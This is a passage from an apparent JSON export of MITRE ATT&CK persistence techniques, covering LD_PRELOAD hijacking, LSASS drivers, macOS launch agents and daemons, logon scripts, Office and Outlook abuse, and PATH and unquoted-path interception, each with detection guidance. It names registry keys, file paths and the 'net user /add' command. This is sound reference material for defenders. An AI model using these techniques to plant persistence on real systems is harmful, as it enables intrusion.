provided absolute paths and common directories for these dependencies, but can be overridden by shared objects specified by LD_PRELOAD to be loaded before all others.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)<\/p>\n<p>Adversaries may set LD_PRELOAD to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. LD_PRELOAD can be set via the environment variable or <code>\/etc\/ld.so.preload<\/code> file.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries) Libraries specified by LD_PRELOAD with be loaded and mapped into memory by <code>dlopen()<\/code> and <code>mmap()<\/code> respectively.(Citation: Code Injection on Linux and macOS) (Citation: Uninformed Needle) (Citation: Phrack halfdead 1997)<\/p>\n<p>LD_PRELOAD hijacking may grant access to the victim process's memory, system\/network resources, and possibly elevated privileges. Execution via LD_PRELOAD hijacking may also evade detection from security products since the execution is masked under a legitimate process.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for changes to environment variables and files associated with loading shared libraries such as LD_PRELOAD, as well as the commands to implement these changes.\n\nMonitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":639,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":642,"name":"T1547.008 - LSASS Driver","sort_id":0,"external_id":"T1547.008","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process. (Citation: Microsoft Security Subsystem)<\/p>\n<p>Adversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., <a href=\"https:\/\/attack.mitre.org\/techniques\/T1574\">Hijack Execution Flow<\/a>), an adversary can use LSA operations to continuously execute malicious payloads.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"With LSA Protection enabled, monitor the event logs (Events 3033 and 3063) for failed attempts to load LSA plug-ins and drivers. (Citation: Microsoft LSA Protection Mar 2014) Also monitor DLL load operations in lsass.exe. (Citation: Microsoft DLL Security)\n\nUtilize the Sysinternals Autoruns\/Autorunsc utility (Citation: TechNet Autoruns) to examine loaded drivers associated with the LSA. ","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":642,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":645,"name":"T1543.001 - Launch Agent","sort_id":0,"external_id":"T1543.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. Per Apple\u2019s developer documentation, when a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (plist) files found in <code>\/System\/Library\/LaunchAgents<\/code>, <code>\/Library\/LaunchAgents<\/code>, and <code>$HOME\/Library\/LaunchAgents<\/code> (Citation: AppleDocs Launch Agent Daemons) (Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware). These launch agents have property list files which point to the executables that will be launched (Citation: OSX.Dok Malware).<\/p>\n<p>Adversaries may install a new launch agent that can be configured to execute at login by using launchd or launchctl to load a plist into the appropriate directories  (Citation: Sofacy Komplex Trojan)  (Citation: Methods of Mac Malware Persistence). The agent name may be disguised by using a name from a related operating system or benign software. Launch Agents are created with user level privileges and are executed with the privileges of the user when they log in (Citation: OSX Malware Detection) (Citation: OceanLotus for OS X). They can be set up to execute when a specific user logs in (in the specific user\u2019s directory structure) or when any user logs in (which requires administrator privileges).<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor Launch Agent creation through additional plist files and utilities such as Objective-See\u2019s  KnockKnock application. Launch Agents also require files on disk for persistence which can also be monitored via other file monitoring applications.","platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":645,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":646,"name":"T1543.004 - Launch Daemon","sort_id":0,"external_id":"T1543.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may create or modify launch daemons to repeatedly execute malicious payloads as part of persistence. Per Apple\u2019s developer documentation, when macOS and OS X boot up, launchd is run to finish system initialization. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in <code>\/System\/Library\/LaunchDaemons<\/code> and <code>\/Library\/LaunchDaemons<\/code> (Citation: AppleDocs Launch Agent Daemons). These LaunchDaemons have property list files which point to the executables that will be launched (Citation: Methods of Mac Malware Persistence). <\/p>\n<p>Adversaries may install a new launch daemon that can be configured to execute at startup by using launchd or launchctl to load a plist into the appropriate directories  (Citation: OSX Malware Detection). The daemon name may be disguised by using a name from a related operating system or benign software (Citation: WireLurker). Launch Daemons may be created with administrator privileges, but are executed under root privileges, so an adversary may also use a service to escalate privileges from administrator to root. <\/p>\n<p>The plist file permissions must be root:wheel, but the script or program that it points to has no such requirement. So, it is possible for poor configurations to allow an adversary to modify a current Launch Daemon\u2019s executable and gain persistence or Privilege Escalation. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for launch daemon creation or modification through plist files and utilities such as Objective-See's KnockKnock application. ","platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":646,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":650,"name":"T1136.001 - Local Account","sort_id":0,"external_id":"T1136.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. With a sufficient level of access, the <code>net user \/add<\/code> command can be used to create a local account.<\/p>\n<p>Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for processes and command-line parameters associated with local account creation, such as <code>net user \/add<\/code> or <code>useradd<\/code>. Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system. (Citation: Microsoft User Creation Event) Perform regular audits of local system accounts to detect suspicious accounts that may have been created by an adversary.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":650,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":650,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":650,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":656,"name":"T1037.002 - Logon Script (Mac)","sort_id":0,"external_id":"T1037.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may use macOS logon scripts automatically executed at logon initialization to establish persistence. macOS allows logon scripts (known as login hooks) to be executed whenever a specific user logs into a system. A login hook tells Mac OS X to execute a certain script when a user logs in, but unlike <a href=\"https:\/\/attack.mitre.org\/techniques\/T1037\/005\">Startup Items<\/a>, a login hook executes as the elevated root user.(Citation: creating login hook)<\/p>\n<p>Adversaries may use these login hooks to maintain persistence on a single system.(Citation: S1 macOs Persistence) Access to login hook scripts may allow an adversary to insert additional malicious code. There can only be one login hook at a time though and depending on the access configuration of the hooks, either local credentials or an administrator account may be necessary. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.","platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":656,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":657,"name":"T1037.001 - Logon Script (Windows)","sort_id":0,"external_id":"T1037.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.(Citation: TechNet Logon Scripts) This is done via adding a path to a script to the <code>HKCU\\Environment\\UserInitMprLogonScript<\/code> Registry key.(Citation: Hexacorn Logon Scripts)<\/p>\n<p>Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for changes to Registry values associated with Windows logon scrips, nameley <code>HKCU\\Environment\\UserInitMprLogonScript<\/code>.\n\nMonitor running process for actions that could be indicative of abnormal programs or executables running upon logon.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":657,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":674,"name":"T1037.003 - Network Logon Script","sort_id":0,"external_id":"T1037.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects.(Citation: Petri Logon Script AD) These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.  <\/p>\n<p>Adversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":674,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":680,"name":"T1137.001 - Office Template Macros","sort_id":0,"external_id":"T1137.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. (Citation: Microsoft Change Normal Template)<\/p>\n<p>Office Visual Basic for Applications (VBA) macros (Citation: MSDN VBA in Office) can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.(Citation: enigma0x3 normal.dotm)(Citation: Hexacorn Office Template Macros) Shared templates may also be stored and pulled from remote locations.(Citation: GlobalDotName Jun 2019) <\/p>\n<p>Word Normal.dotm location:<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm<\/code><\/p>\n<p>Excel Personal.xlsb location:<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB<\/code><\/p>\n<p>Adversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under <code>C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\<\/code>, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.(Citation: GlobalDotName Jun 2019) <\/p>\n<p>An adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence.(Citation: CrowdStrike Outlook Forms)(Citation: Outlook Today Home Page) Modification to base templates, like Normal.dotm, should also be investigated since the base templates should likely not contain VBA macros. Changes to the Office macro security settings should also be investigated.(Citation: GlobalDotName Jun 2019)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":680,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":680,"platform_id":4,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":681,"name":"T1137.002 - Office Test","sort_id":0,"external_id":"T1137.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may abuse the Microsoft Office &quot;Office Test&quot; Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.(Citation: Hexacorn Office Test)(Citation: Palo Alto Office Test Sofacy)<\/p>\n<p>There exist user and global Registry keys for the Office Test feature:<\/p>\n<ul>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf<\/code><\/li>\n<li><code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office test\\Special\\Perf<\/code><\/li>\n<\/ul>\n<p>Adversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for the creation of the Office Test Registry key. Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence. Since v13.52, Autoruns can detect tasks set up using the Office Test Registry key.(Citation: Palo Alto Office Test Sofacy)\n\nConsider monitoring Office processes for anomalous DLL loads.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":681,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":681,"platform_id":4,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":683,"name":"T1137.003 - Outlook Forms","sort_id":0,"external_id":"T1137.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.(Citation: SensePost Outlook Forms)<\/p>\n<p>Once malicious forms have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.(Citation: SensePost Outlook Forms)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) SensePost, whose tool [Ruler](https:\/\/attack.mitre.org\/software\/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)\n\nCollect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":683,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":683,"platform_id":4,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":684,"name":"T1137.004 - Outlook Home Page","sort_id":0,"external_id":"T1137.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.(Citation: SensePost Outlook Home Page)<\/p>\n<p>Once malicious home pages have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded\/reloaded.(Citation: SensePost Outlook Home Page)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) SensePost, whose tool [Ruler](https:\/\/attack.mitre.org\/software\/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)\n\nCollect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":684,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":684,"platform_id":4,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":685,"name":"T1137.005 - Outlook Rules","sort_id":0,"external_id":"T1137.005","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.(Citation: SilentBreak Outlook Rules)<\/p>\n<p>Once malicious rules have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.(Citation: SilentBreak Outlook Rules)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) SensePost, whose tool [Ruler](https:\/\/attack.mitre.org\/software\/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)\n\nCollect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":685,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":685,"platform_id":4,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":693,"name":"T1574.007 - Path Interception by PATH Environment Variable","sort_id":0,"external_id":"T1574.007","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line.<\/p>\n<p>The PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, <code>%SystemRoot%\\system32<\/code> (e.g., <code>C:\\Windows\\system32<\/code>), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.<\/p>\n<p>For example, if <code>C:\\example path<\/code> precedes <\/code>C:\\Windows\\system32<\/code> is in the PATH environment variable, a program that is named net.exe and placed in <code>C:\\example path<\/code> will be called instead of the Windows system &quot;net&quot; when &quot;net&quot; is executed from the command-line.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.\n\nData and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":693,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":694,"name":"T1574.008 - Path Interception by Search Order Hijacking","sort_id":0,"external_id":"T1574.008","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.<\/p>\n<p>Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike <a href=\"https:\/\/attack.mitre.org\/techniques\/T1574\/001\">DLL Search Order Hijacking<\/a>, the search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.<\/p>\n<p>For example, &quot;example.exe&quot; runs &quot;cmd.exe&quot; with the command-line argument <code>net user<\/code>. An adversary may place a program called &quot;net.exe&quot; within the same directory as example.exe, &quot;net.exe&quot; will be run instead of the Windows system utility net. In addition, if an adversary places a program called &quot;net.com&quot; in the same directory as &quot;net.exe&quot;, then <code>cmd.exe \/C net user<\/code> will execute &quot;net.com&quot; instead of &quot;net.exe&quot; due to the order of executable extensions defined under PATHEXT. (Citation: Microsoft Environment Property)<\/p>\n<p>Search order hijacking is also a common practice for hijacking DLL loads and is covered in <a href=\"https:\/\/attack.mitre.org\/techniques\/T1574\/001\">DLL Search Order Hijacking<\/a>.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.\n\nData and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":694,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":695,"name":"T1574.009 - Path Interception by Unquoted Path","sort_id":0,"external_id":"T1574.009","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.<\/p>\n<p>Service paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe<\/code> vs. <code>&quot;C:\\safe path with space\\program.exe&quot;<\/code>). (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\program files\\myapp.exe<\/code>, an adversary may create a program at <code>C:\\program.exe<\/code> that will be run instead of the intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide)<\/p>\n<p>This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.\n\nData and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":695,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":697,"name":"T1547.011 - Plist Modification","sort_id":0,"external_id":"T1547.011","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may modify plist files to run a program during system boot or user login. Property list (plist) files contain all of the information that macOS and OS X uses to configure applications and services. These files are UTF-8 encoded and formatted like XML documents via a series of keys surrounded by &lt; 